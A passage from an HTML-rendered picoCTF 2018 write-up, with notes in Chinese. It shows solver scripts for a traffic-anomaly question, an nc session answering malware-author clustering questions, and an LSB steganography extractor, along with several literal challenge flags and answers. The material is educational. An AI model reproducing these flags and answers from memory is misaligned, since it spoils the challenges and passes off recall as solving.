</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-49>49</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>log<span style=color:#f92672>=</span>[
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10850</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10750</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10850</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>10700</span>,<span style=color:#ae81ff>10850</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10850</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>11050</span>,<span style=color:#ae81ff>10650</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10700</span>,<span style=color:#ae81ff>11000</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>10950</span>,<span style=color:#ae81ff>10950</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>11100</span>,<span style=color:#ae81ff>11900</span>,<span style=color:#ae81ff>13400</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>13800</span>,<span style=color:#ae81ff>13400</span>,<span style=color:#ae81ff>12000</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10700</span>,<span style=color:#ae81ff>10800</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>11050</span>,<span style=color:#ae81ff>11800</span>,<span style=color:#ae81ff>13100</span>,<span style=color:#ae81ff>14600</span>,<span style=color:#ae81ff>16100</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>16600</span>,<span style=color:#ae81ff>16400</span>,<span style=color:#ae81ff>14400</span>,<span style=color:#ae81ff>12800</span>,<span style=color:#ae81ff>11800</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>10950</span>,<span style=color:#ae81ff>10800</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>10850</span>,<span style=color:#ae81ff>10850</span>,<span style=color:#ae81ff>10800</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>11400</span>,<span style=color:#ae81ff>11900</span>,<span style=color:#ae81ff>13000</span>,<span style=color:#ae81ff>14000</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>14800</span>,<span style=color:#ae81ff>15800</span>,<span style=color:#ae81ff>16200</span>,<span style=color:#ae81ff>15800</span>,<span style=color:#ae81ff>14700</span>,<span style=color:#ae81ff>13700</span>,<span style=color:#ae81ff>12200</span>,<span style=color:#ae81ff>12100</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>11100</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10700</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>11000</span>,<span style=color:#ae81ff>10800</span>,
</span></span><span style=display:flex><span>    <span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>10700</span>,<span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>10800</span>,<span style=color:#ae81ff>10750</span>,<span style=color:#ae81ff>10950</span>,<span style=color:#ae81ff>10900</span>,<span style=color:#ae81ff>10800</span>
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>=</span>remote(<span style=color:#e6db74>&#39;2018shell2.picoctf.com&#39;</span>,<span style=color:#ae81ff>39410</span>)
</span></span><span style=display:flex><span>prompt<span style=color:#f92672>=</span>r<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>&#39;num_IPs&#39;</span>)
</span></span><span style=display:flex><span>data<span style=color:#f92672>=</span>r<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>nums<span style=color:#f92672>=</span>data<span style=color:#f92672>.</span>split()
</span></span><span style=display:flex><span>print prompt,<span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>,nums
</span></span><span style=display:flex><span>group<span style=color:#f92672>=</span>len(nums)<span style=color:#f92672>/</span><span style=color:#ae81ff>4</span>
</span></span><span style=display:flex><span>res<span style=color:#f92672>=</span>[]
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(group):
</span></span><span style=display:flex><span>	t<span style=color:#f92672>=</span>nums[i<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span><span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>]<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;:&#39;</span>)
</span></span><span style=display:flex><span>	tt<span style=color:#f92672>=</span>int(t[<span style=color:#ae81ff>0</span>])<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span><span style=color:#f92672>+</span>int(t[<span style=color:#ae81ff>1</span>])<span style=color:#f92672>/</span><span style=color:#ae81ff>15</span>
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>if</span> int(nums[i<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span><span style=color:#f92672>+</span><span style=color:#ae81ff>3</span>])<span style=color:#f92672>&gt;</span>log[tt]:
</span></span><span style=display:flex><span>		res<span style=color:#f92672>.</span>append(nums[i<span style=color:#f92672>*</span><span style=color:#ae81ff>4</span>])
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>sendline(<span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>.</span>join(res))
</span></span><span style=display:flex><span>print <span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>.</span>join(res),r<span style=color:#f92672>.</span>recv()
</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>close()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># [x] Opening connection to 2018shell2.picoctf.com on port 39410</span>
</span></span><span style=display:flex><span><span style=color:#75715e># [x] Opening connection to 2018shell2.picoctf.com on port 39410: Trying 18.224.157.204</span>
</span></span><span style=display:flex><span><span style=color:#75715e># [+] Opening connection to 2018shell2.picoctf.com on port 39410: Done</span>
</span></span><span style=display:flex><span><span style=color:#75715e># You&#39;ll need to consult the file `traffic.png` to answer the following questions.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Which of these logs have significantly higher traffic than is usual for their time of day? You can see usual traffic on the attached plot. There may be multiple logs with higher than usual traffic, so answer all of them! Give your answer as a list of `log_ID` values separated by spaces. For example, if you want to answer that logs 2 and 7 are the ones with higher than usual traffic, type 2 7.</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#     log_ID      time  num_IPs </span>
</span></span><span style=display:flex><span><span style=color:#75715e># [&#39;0&#39;, &#39;0&#39;, &#39;01:00:00&#39;, &#39;11637&#39;, &#39;1&#39;, &#39;1&#39;, &#39;01:30:00&#39;, &#39;11640&#39;, &#39;2&#39;, &#39;2&#39;, &#39;02:45:00&#39;, &#39;11616&#39;, &#39;3&#39;, &#39;3&#39;, &#39;10:45:00&#39;, &#39;9962&#39;, &#39;4&#39;, &#39;4&#39;, &#39;10:45:00&#39;, &#39;10409&#39;, &#39;5&#39;, &#39;5&#39;, &#39;11:45:00&#39;, &#39;12732&#39;, &#39;6&#39;, &#39;6&#39;, &#39;14:15:00&#39;, &#39;10538&#39;, &#39;7&#39;, &#39;7&#39;, &#39;16:15:00&#39;, &#39;10233&#39;, &#39;8&#39;, &#39;8&#39;, &#39;17:30:00&#39;, &#39;10839&#39;, &#39;9&#39;, &#39;9&#39;, &#39;20:15:00&#39;, &#39;11936&#39;, &#39;10&#39;, &#39;10&#39;, &#39;20:30:00&#39;, &#39;9898&#39;, &#39;11&#39;, &#39;11&#39;, &#39;21:45:00&#39;, &#39;9653&#39;, &#39;12&#39;, &#39;12&#39;, &#39;22:30:00&#39;, &#39;10252&#39;, &#39;13&#39;, &#39;13&#39;, &#39;23:15:00&#39;, &#39;9619&#39;]</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 0 1 2 9 Correct!</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Great job. You&#39;ve earned the flag: picoCTF{w4y_0ut_940df760}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># [*] Closed connection to 2018shell2.picoctf.com port 39410</span>
</span></span><span style=display:flex><span><span style=color:#75715e># [Finished in 3.6s]</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=whats-my-name>What&rsquo;s My Name?<a hidden class=anchor aria-hidden=true href=#whats-my-name>#</a></h2><p><code>picoCTF{w4lt3r_wh1t3_ddfad6f8f4255adc73e862e3cebeee9d}</code></p><p><img loading=lazy src=30d1eebbc7aa0b915.png alt></p><h2 id=malware-shops>Malware Shops<a hidden class=anchor aria-hidden=true href=#malware-shops>#</a></h2><p>附件貌似有问题，爆破出第一个答案是5，第二个随手交一下flag就出来了。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-26>26</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ nc 2018shell2.picoctf.com <span style=color:#ae81ff>57920</span>
</span></span><span style=display:flex><span>You<span style=color:#e6db74>&#39;ll need to consult the file `clusters.png` to answer the following questions.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>How many attackers created the malware in this dataset?
</span></span></span><span style=display:flex><span><span style=color:#e6db74>5
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Correct!
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>In the following sample of files from the larger dataset, which file was made by the same attacker who made the file 87847bfc? Indicate your answer by entering that file&#39;</span>s hash.
</span></span><span style=display:flex><span>       hash  jmp_count  add_count
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>  87847bfc       32.0       29.0
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>  7eeed4b3       34.0       34.0
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>  ad5e4ce0       21.0       64.0
</span></span><span style=display:flex><span><span style=color:#ae81ff>3</span>  628e79cf       14.0       26.0
</span></span><span style=display:flex><span><span style=color:#ae81ff>4</span>  b5e53809       11.0       35.0
</span></span><span style=display:flex><span><span style=color:#ae81ff>5</span>  ebaf5ccd       15.0       13.0
</span></span><span style=display:flex><span><span style=color:#ae81ff>6</span>  94ad3582       37.0       10.0
</span></span><span style=display:flex><span><span style=color:#ae81ff>7</span>  42f1d364       23.0       68.0
</span></span><span style=display:flex><span><span style=color:#ae81ff>8</span>  93827b93       11.0       38.0
</span></span><span style=display:flex><span><span style=color:#ae81ff>9</span>  c08300fe       41.0       10.0
</span></span><span style=display:flex><span>7eeed4b3
</span></span><span style=display:flex><span>Correct!
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Great job. You<span style=color:#960050;background-color:#1e0010>&#39;</span>ve earned the flag: picoCTF<span style=color:#f92672>{</span>w4y_0ut_0915ebc6<span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=loadsomebits>LoadSomeBits<a hidden class=anchor aria-hidden=true href=#loadsomebits>#</a></h2><p>最低有效位隐写，需要fuzz起始偏移。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-12>12</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># cat lsb.py</span>
</span></span><span style=display:flex><span>import binascii
</span></span><span style=display:flex><span>lsb<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>.join<span style=color:#f92672>(</span>map<span style=color:#f92672>(</span>lambda x:str<span style=color:#f92672>(</span>ord<span style=color:#f92672>(</span>x<span style=color:#f92672>)</span>&amp;1<span style=color:#f92672>)</span>,open<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;pico2018-special-logo.bmp&#39;</span>,<span style=color:#e6db74>&#39;rb&#39;</span><span style=color:#f92672>)</span>.read<span style=color:#f92672>()))</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> offset in range<span style=color:#f92672>(</span>16<span style=color:#f92672>)</span>:
</span></span><span style=display:flex><span>        tmp<span style=color:#f92672>=</span>lsb<span style=color:#f92672>[</span>offset:<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>        tmps<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>.join<span style=color:#f92672>(</span>chr<span style=color:#f92672>(</span>int<span style=color:#f92672>(</span>tmp<span style=color:#f92672>[</span>i:i+8<span style=color:#f92672>]</span>,2<span style=color:#f92672>))</span> <span style=color:#66d9ef>for</span> i in range<span style=color:#f92672>(</span>0,len<span style=color:#f92672>(</span>tmp<span style=color:#f92672>)</span>,8<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>  <span style=color:#e6db74>&#39;pico&#39;</span> in tmps:
</span></span><span style=display:flex><span>                print tmps
